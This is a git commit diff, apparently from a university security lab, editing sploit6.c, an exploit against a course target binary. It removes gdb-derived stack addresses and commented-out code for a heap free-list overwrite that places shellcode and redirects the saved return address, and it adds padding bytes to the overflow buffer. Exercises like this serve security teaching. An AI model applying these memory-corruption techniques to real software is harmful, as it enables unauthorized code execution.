4fd4633e50f720e61ad3a1eef4eb2bc17126d51d
Da  Ma <mada1@remote.ecf.utoronto.ca>
2024-02-01 01:50:01 -0500

    niubi!

--- sploits/sploit6.c
+++ sploits/sploit6.c
@@ -7,30 +7,10 @@
 
 #define TARGET "../targets/target6"
 
-/*
-  rbp at 0x3021fea0, rip at 0x3021fea8
-  (gdb) p &arg
-  $1 = (char **) 0x3021fe88
-  (gdb) p &p
-  $2 = (char **) 0x3021fe98
-  (gdb) p &q
-  $3 = (char **) 0x3021fe90
-*/
-
 int main(void)
 {
   char *args[3];
   char *env[1];
-
-  // uint32_t input[33];
-  // memset(input, 0x90, sizeof(input));
-  // memcpy(input + 2, shellcode, sizeof(shellcode) - 1);
-
-  // input[0] =  0x010106eb; /* eb 06: jmp 8 */
-  // input[1] =  0x01010101;
-
-  // input[18] = 0x0104ec48; /* q left  - shellcode */
-  // input[19] = 0x3021fea8; /* q right - saved rip */
 
   // Start
   char buf[192];
@@ -44,6 +24,8 @@ int main(void)
   buf[1] = '\x05'; // This should be the jump distance
   buf[2] = '\x01';
   buf[3] = '\x01';
+
+  // Pad the first 3 bytes
   buf[4] = '\x01';
   buf[5] = '\x01';
   buf[6] = '\x01';
